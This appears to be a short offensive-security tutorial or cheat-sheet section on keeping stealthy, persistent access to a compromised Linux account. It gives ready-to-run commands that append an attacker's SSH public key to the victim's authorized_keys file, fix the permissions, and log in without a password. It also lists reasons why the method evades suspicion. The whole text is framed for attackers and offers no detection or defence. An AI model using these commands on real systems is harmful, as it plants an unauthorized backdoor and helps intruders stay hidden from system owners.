Stealthy Access via SSH Keys

Gaining passwordless SSH access to compromised accounts for direct, interactive shells.

# Example: Adding your public SSH key to authorized_keys
# Assume you have gained access and are in the target user's home directory
# Replace YOUR_PUBLIC_KEY_HERE with your actual SSH public key
echo "ssh-rsa YOUR_PUBLIC_KEY_HERE attacker@kali" >> ~/.ssh/authorized_keys

# Ensure correct permissions for the .ssh directory
chmod 700 ~/.ssh

# Ensure correct permissions for the authorized_keys file
chmod 600 ~/.ssh/authorized_keys

# Now, from your attacking machine, you can SSH without a password:
# ssh username@target_ip

Why SSH Keys?

  • Provides direct, interactive shell access.
  • Bypasses password authentication once key is installed.
  • Leverages a legitimate service, making it less suspicious.
  • Often stealthier than continuous cron job connections.

Crucial Permissions

SSH requires strict permissions on the ~/.ssh directory (700) and authorized_keys file (600). Incorrect permissions will prevent key-based authentication from working.

Key Takeaway

SSH keys offer a robust and stealthy method for persistent access on Linux, providing a direct interactive shell.
